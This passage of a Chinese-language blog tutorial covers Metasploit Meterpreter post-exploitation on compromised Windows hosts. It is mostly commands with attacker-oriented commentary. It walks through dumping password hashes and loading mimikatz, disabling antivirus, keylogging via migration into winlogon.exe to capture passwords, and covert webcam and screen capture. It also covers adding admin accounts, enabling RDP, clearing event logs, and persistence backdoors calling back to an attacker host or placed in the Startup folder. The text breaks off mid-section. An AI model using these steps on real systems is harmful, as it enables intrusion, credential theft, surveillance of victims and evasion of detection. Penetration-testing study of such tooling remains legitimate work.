class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line"><span class="built_in">bg</span>                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line"><span class="built_in">exit</span>                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line"><span class="built_in">help</span>                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line"><span class="built_in">read</span>                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line"><span class="built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="built_in">cat</span>                           将文件内容读到屏幕上</span><br><span class="line"><span class="built_in">cd</span>                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line"><span class="built_in">cp</span>                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line"><span class="built_in">dir</span>                           列出文件（<span class="built_in">ls</span> 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line"><span class="built_in">ls</span>                            列出文件</span><br><span class="line"><span class="built_in">mkdir</span>                         制作目录</span><br><span class="line"><span class="built_in">mv</span>                            将源移动到目标</span><br><span class="line"><span class="built_in">pwd</span>                           打印工作目录</span><br><span class="line"><span class="built_in">rm</span>                            删除指定文件</span><br><span class="line"><span class="built_in">rmdir</span>                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line"><span class="built_in">kill</span>                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line"><span class="built_in">suspend</span>                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入： <strong>shell</strong>即可切换到目标主机的<strong>Windows cmd_shell</strong>里面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell         <span class="comment">#获取目标主机的cmd_shell权限</span></span><br><span class="line">chcp 65001    <span class="comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span></span><br></pre></td></tr></table></figure>
+
+<p>要想从目标主机<strong>shell</strong>退出到<strong>meterpreter</strong>输入：<strong>exit</strong></p>
+<p>从<strong>meterpreter</strong>退出到<strong>MSF</strong>框架</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background   <span class="comment">#把我们获得的meterpreter会话挂载到后台运行</span></span><br></pre></td></tr></table></figure>
+
+<p>查看前面获得的<strong>meterpreter_shell</strong>会话，最前面的数字是会话的id</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions  -l    <span class="comment">#查看获得的meterpreter_shell会话列表</span></span><br></pre></td></tr></table></figure>
+
+<p>输入: sessions [id号] 即可进入相应的meterpreter_shell中</p>
+<p>输入: shell即可进入 cmd 类型的控制，再输入：powershell，即可进入 powershell 类型的控制台</p>
+<p>帮助命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sysinfo             									<span class="comment">#查看目标主机系统信息</span></span><br><span class="line">run scraper         									<span class="comment">#查看目标主机详细信息</span></span><br><span class="line">run hashdump        									<span class="comment">#导出密码的哈希</span></span><br><span class="line">load kiwi           									<span class="comment">#加载mimikatz</span></span><br><span class="line">ps                  									<span class="comment">#查看目标主机进程信息</span></span><br><span class="line"><span class="built_in">pwd</span>                		 								<span class="comment">#查看目标当前目录(windows)</span></span><br><span class="line">getlwd              									<span class="comment">#查看目标当前目录(Linux)</span></span><br><span class="line">search -f *.jsp -d e:\                					<span class="comment">#搜索E盘中所有以.jsp为后缀的文件</span></span><br><span class="line">download  e:\test.txt  /root          					<span class="comment">#将目标机的e:\test.txt文件下载到/root目录下</span></span><br><span class="line">upload    /root/test.txt d:\<span class="built_in">test</span>      					<span class="comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span></span><br><span class="line">getpid             										<span class="comment">#查看当前Meterpreter Shell的进程PID</span></span><br><span class="line">migrate 1384        									<span class="comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span></span><br><span class="line">idletime           		 								<span class="comment">#查看主机运行时间</span></span><br><span class="line">getuid              									<span class="comment">#查看获取的当前权限</span></span><br><span class="line">getsystem           									<span class="comment">#提权,获得的当前用户是administrator才能成功</span></span><br><span class="line">run  killav        			 							<span class="comment">#关闭杀毒软件</span></span><br><span class="line">screenshot          									<span class="comment">#截图</span></span><br><span class="line">webcam_list         									<span class="comment">#查看目标主机的摄像头</span></span><br><span class="line">webcam_snap         									<span class="comment">#拍照</span></span><br><span class="line">webcam_stream       									<span class="comment">#开视频</span></span><br><span class="line">execute 参数 -f 可执行文件   							    <span class="comment">#执行可执行程序</span></span><br><span class="line">run getgui -u test1 -p Abc123456    					<span class="comment">#创建test1用户，密码为Abc123456</span></span><br><span class="line">run getgui -e                							<span class="comment">#开启远程桌面</span></span><br><span class="line">keyscan_start                							<span class="comment">#开启键盘记录功能</span></span><br><span class="line">keyscan_dump                			 				<span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop                 							<span class="comment">#停止键盘记录功能</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  keyboard     							<span class="comment">#禁止目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   keyboard     							<span class="comment">#允许目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>  mouse        							<span class="comment">#禁止目标使用鼠标</span></span><br><span class="line">uictl  <span class="built_in">enable</span>   mouse        							<span class="comment">#允许目标使用鼠标</span></span><br><span class="line">load                        							<span class="comment">#使用扩展库</span></span><br><span class="line">run				             							<span class="comment">#使用扩展库</span></span><br><span class="line"> </span><br><span class="line">run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <span class="comment">#会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span></span><br><span class="line">portfwd add -l 9999 -r 192.168.100.158 -p 3389     		<span class="comment">#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">clearev                       <span class="comment">#清除日志</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h6><blockquote>
+<p>该模块主要用于在取得目标主机系统远程控制权后</p>
+<p>进行一系列的后渗透攻击动作</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate                			<span class="comment">#自动进程迁移</span></span><br><span class="line">run post/windows/gather/checkvm                			<span class="comment">#查看目标主机是否运行在虚拟机上</span></span><br><span class="line">run post/windows/manage/killav                			<span class="comment">#关闭杀毒软件</span></span><br><span class="line">run post/windows/manage/enable_rdp            			<span class="comment">#开启远程桌面服务</span></span><br><span class="line">run post/windows/manage/autoroute              			<span class="comment">#查看路由信息</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users    		<span class="comment">#列举当前登录的用户</span></span><br><span class="line">run post/windows/gather/enum_applications       		<span class="comment">#列举应用程序</span></span><br><span class="line">run post/windows/gather/credentials/windows_autologin 	<span class="comment">#抓取自动登录的用户名和密码</span></span><br><span class="line">run post/windows/gather/smart_hashdump               	<span class="comment">#dump出所有用户的hash</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="查看主机是否运行在虚拟机上"><a href="#查看主机是否运行在虚拟机上" class="headerlink" title="查看主机是否运行在虚拟机上"></a>查看主机是否运行在虚拟机上</h6><p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure>
+
+<h6 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h6><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run  killav</span><br></pre></td></tr></table></figure>
+
+<h6 id="获取目标主机的详细信息"><a href="#获取目标主机的详细信息" class="headerlink" title="获取目标主机的详细信息"></a>获取目标主机的详细信息</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scraper </span><br></pre></td></tr></table></figure>
+
+<p>它将目标机器上的常见信息收集起来然后下载保存在本地</p>
+<h6 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h6><p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>     <span class="comment">#查看当前目录</span></span><br><span class="line"><span class="built_in">cd</span>      <span class="comment">#切换目标目录；</span></span><br><span class="line"><span class="built_in">cat</span>     <span class="comment">#读取文件内容；</span></span><br><span class="line"><span class="built_in">rm</span>      <span class="comment">#删除文件；</span></span><br><span class="line">edit    <span class="comment">#使用vim编辑文件</span></span><br><span class="line"><span class="built_in">ls</span>      <span class="comment">#获取当前目录下的文件；</span></span><br><span class="line"><span class="built_in">mkdir</span>   <span class="comment">#新建目录；</span></span><br><span class="line"><span class="built_in">rmdir</span>   <span class="comment">#删除目录； </span></span><br></pre></td></tr></table></figure>
+
+<h6 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h6><ol>
+<li>下载文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download  file <span class="comment">#命令可以帮助我们从目标系统中下载文件</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>上传文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload  file  <span class="comment">#命令则能够向目标系统上传文件。</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><blockquote>
+<p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制</p>
+<p>而这将会严重影响你在目标系统中的活动</p>
+<p>比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限</p>
+<p>而 Meterpreter 给我们提供了一个 getsystem 命令</p>
+<p>它可以使用多种技术在目标系统中实现提权</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line"><span class="comment">#获取当前用户的信息</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment">#自动提权为系统权限</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</strong></p>
+<h6 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h6><p>先查看目标主机安装了哪些应用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications  <span class="comment">#查看目标主机安装了哪些应用</span></span><br></pre></td></tr></table></figure>
+
+<p>在meterpreter_shell命令行执行目标系统中的应用程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#execute命令用法：</span></span><br><span class="line">execute [参数] -f 指定的可执行文件</span><br><span class="line"></span><br><span class="line">-f：指定可执行文件</span><br><span class="line">-H：创建一个隐藏进程</span><br><span class="line">-a：传递给命令的参数</span><br><span class="line">-i：跟进程进行交互</span><br><span class="line">-m：从内存中执行</span><br><span class="line">-t：使用当前伪造的线程令牌运行进程</span><br><span class="line">-s：在给定会话中执行进程</span><br></pre></td></tr></table></figure>
+
+<h6 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h6><p>截图目标主机屏幕, 图片被保存到 <strong>&#x2F;root&#x2F;桌面&#x2F;</strong> 目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot <span class="comment">#截图目标主机屏幕</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="创建一个新账号"><a href="#创建一个新账号" class="headerlink" title="创建一个新账号"></a>创建一个新账号</h6><p>查看目标主机有哪些用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br><span class="line"><span class="comment">#查看目标主机有用户</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>在目标系统中创建一个新的用户账号的方法一</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run getgui -u 用户 -p 密码</span><br><span class="line">-u: 指定用户</span><br><span class="line">-p: 指定密码</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了</strong></p>
+<p><strong>这里成功创建了用户，但是添加到Administrators组中失败了!</strong></p>
+<p>如果添加到Administrators组中失败了的话</p>
+<p>可以运行 shell ，进入cmd窗口手动将该用户添加到administrators组中</p>
+<p><strong>在目标系统中创建一个新的用户账号的方法二</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enable_rdp脚本:</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=test2 PASSWORD=Abc123456</span><br><span class="line"><span class="comment">#添加用户</span></span><br><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line"><span class="comment">#开启远程桌面</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=<span class="literal">true</span> LPORT=6662</span><br><span class="line"><span class="comment">#将3389端口转发到6662</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="启用远程桌面"><a href="#启用远程桌面" class="headerlink" title="启用远程桌面"></a>启用远程桌面</h6><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了</p>
+<p>首先，需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务）</p>
+<p>输入：<strong>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</strong> 命令可以开启远程桌面</p>
+<p>在开启远程桌面会话之前</p>
+<p>我们还需要使用 <strong>idletime</strong> 命令检查远程用户的空闲时长</p>
+<p>开启远程桌面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以使用远程桌面用创建的用户远程登录目标主机了</p>
+<h6 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h6><p>Meterpreter还可以在目标设备上实现键盘记录功能</p>
+<p>键盘记录主要涉及以下三种命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start： </span><br><span class="line"><span class="comment">#开启键盘记录功能</span></span><br><span class="line"><span class="comment">#开关键盘记录功能后目标输入的内容</span></span><br><span class="line"><span class="comment">#通过keyscan_dump命令在Meterpreter里面进行查看；</span></span><br><span class="line">keyscan_dump：</span><br><span class="line"><span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop：</span><br><span class="line"><span class="comment">#停止键盘记录功能</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注：在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来介绍如何绑定进程，然后获取该进程下的键盘记录</strong></p>
+<h6 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h6><p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定</p>
+<p>因此，我们可以让 <strong>Meterpreter</strong> 与类似 <strong>explorer.exe</strong> 这样的进程进行绑定</p>
+<p>并以此来实现持久化</p>
+<p>将 <strong>Meterpreter</strong> 跟 <strong>winlogon.exe</strong> 绑定</p>
+<p>并在登录进程中捕获键盘记录，以获得用户的密码</p>
+<p>使用 <strong>ps</strong> 命令查看目标设备中运行的进程</p>
+<p>我们可以使用 <strong>getpid</strong> 查看我们当前的进程id</p>
+<p>使用 <strong>migrate</strong> + <strong>目标进程ID</strong> 命令来绑定目标进程id</p>
+<p>可以看到通过进程迁移后</p>
+<p>当前的 <strong>Meterpreter</strong> 的 <strong>pid</strong> 已经和 <strong>winlogon.exe</strong> 一样了</p>
+<p>绑定目标pid的时候，经常会断了shell</p>
+<p>进程迁移后会自动关闭原来Meterpreter进程</p>
+<p>没有关闭可使用 <strong>kill pid</strong> 命令关闭进程</p>
+<p>或者使用自动迁移进程</p>
+<p><strong>run post&#x2F;windows&#x2F;manage&#x2F;migrate</strong></p>
+<p>系统会自动寻找合适的进程然后迁移</p>
+<h6 id="禁止目标主机使用键盘鼠标"><a href="#禁止目标主机使用键盘鼠标" class="headerlink" title="禁止目标主机使用键盘鼠标"></a>禁止目标主机使用键盘鼠标</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) keyboard  <span class="comment">#禁止(允许)目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) mouse     <span class="comment">#禁止(允许)目标使用鼠标</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="用目标主机摄像头拍照"><a href="#用目标主机摄像头拍照" class="headerlink" title="用目标主机摄像头拍照"></a>用目标主机摄像头拍照</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list    <span class="comment">#获取目标系统的摄像头列表</span></span><br><span class="line">webcam_snap    <span class="comment">#从指定的摄像头，拍摄照片</span></span><br><span class="line">webcam_stream  <span class="comment">#从指定的摄像头，开启视频</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="常用扩展库介绍"><a href="#常用扩展库介绍" class="headerlink" title="常用扩展库介绍"></a>常用扩展库介绍</h6><blockquote>
+<p>meterpreter中不仅有基本命令还有很多扩展库</p>
+<p>介绍一下常用的扩展库的查看方法</p>
+</blockquote>
+<ol>
+<li>load&#x2F;use命令</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load/use     <span class="comment">#加载模块</span></span><br><span class="line">load -l      <span class="comment">#列出所有可用的扩展</span></span><br><span class="line">load -<span class="built_in">help</span>   <span class="comment">#帮助；说明</span></span><br></pre></td></tr></table></figure>
+
+<p>输入 <strong>load</strong> 后， <strong>双击Tab键</strong> 列出可用扩展</p>
+<ol start="2">
+<li>run命令</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run   <span class="comment">#执行一个已有的模块</span></span><br><span class="line"><span class="comment">#run+双击Tab键，会列出所有的已有的脚本；</span></span><br><span class="line"><span class="comment">#常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等。</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>run+双击Tab键</strong> ，会列出所有的已有的脚本</p>
+<h6 id="生成持续性后门"><a href="#生成持续性后门" class="headerlink" title="生成持续性后门"></a>生成持续性后门</h6><blockquote>
+<p>因为meterpreter 是基于内存DLL建立的连接</p>
+<p>所以，只要目标主机关机，连接就会断</p>
+<p>总不可能每次想连接的时候，每次都去攻击</p>
+<p>然后再利用 meterpreter 建立连接</p>
+<p>所以，得在目标主机系统内留下一个持续性的后门</p>
+<p>只要目标主机开机了，就可以连接到该主机</p>
+</blockquote>
+<p>建立持续性后门有两种方法</p>
+<p>一种是通过 <strong>启动项启动(persistence)</strong></p>
+<p>一种是通过 <strong>服务启动(metsvc)</strong></p>
+<ol>
+<li>启动项启动</li>
+</ol>
+<p>启动项启动的话，我们先生成一个后门木马</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/83869141">木马生成-CSDN</a></p>
+<p>然后放到 <strong>windows的启动目录</strong> 中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<p>这样这个后门每次开机就都能启动了</p>
+<p>然后只要相连就监听相应的端口就行了</p>
+<ol start="2">
+<li>服务启动</li>
+</ol>
+<p>通过服务启动，我们可以运行命令</p>
